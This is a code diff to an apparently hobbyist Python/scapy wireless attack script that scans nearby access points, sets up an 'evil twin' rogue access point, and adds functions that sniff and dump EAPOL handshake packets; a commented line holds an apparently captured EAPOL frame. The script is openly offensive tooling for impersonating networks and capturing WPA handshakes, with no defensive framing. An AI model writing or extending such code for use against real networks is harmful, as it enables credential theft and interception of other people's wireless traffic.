@@ -3,6 +3,9 @@ import time
 
 import pandas as pd
 from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11
+from scapy.layers.eap import EAPOL
+from scapy.layers.l2 import Ether
+from scapy.packet import Raw
 from scapy.sendrecv import sniff
 
 # initialize the networks dataframe that will contain all access points nearby
@@ -52,6 +55,15 @@ def search_for_networks(timeout: int = 60):
     sniff(prn=scanning, iface=interface, timeout=timeout)
 
 
+def get_network_clients():
+    def sniff_clients(packet):
+        if packet[Ether].type == 'EAPOL':
+            print(packet.show())
+
+
+    sniff(prn=sniff_clients, iface=interface, timeout=50)
+
+
 def create_evil_twin():
     print('stopping network manager...')
     os.system('systemctl stop NetworkManager')
@@ -85,12 +97,35 @@ def stop_attack():
     os.system("systemctl start NetworkManager")
 
 
+i = 0
+
+
+def sniffing():
+    def sn(pkt):
+        global i
+        if EAPOL in pkt:  # Data - QoS data
+            s: str = pkt[Raw].load
+            i += 1
+            print(i)
+            # print(f'\033[92m{i}\033[00m')
+            print(pkt.show())
+            print(pkt[Raw].load)
+            # print(print(s[0:4]))
+            # print(pkt[Raw].load.decode('utf-8'))
+            # print(pkt[Raw].show())
+    sniff(prn=sn, iface=interface, timeout=60)
+
+
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    stop_attack()
-    set_interface()
+    # a = b'\x02\x03\x00_\x02\x00\x8a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01-xTg$\xccO\xe7\x8c\xb5uwx\x0c\x03\x9d}\xf4\xabj\xc0\xed/(\x8f\xd8\xdd\xec\xb5l;\xc9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    # print(a)
+    sniffing()
+    # stop_attack()
+    # set_interface()
+    # get_network_clients()
     # search_for_networks()
-    create_evil_twin()
+    # create_evil_twin()
 
 
 
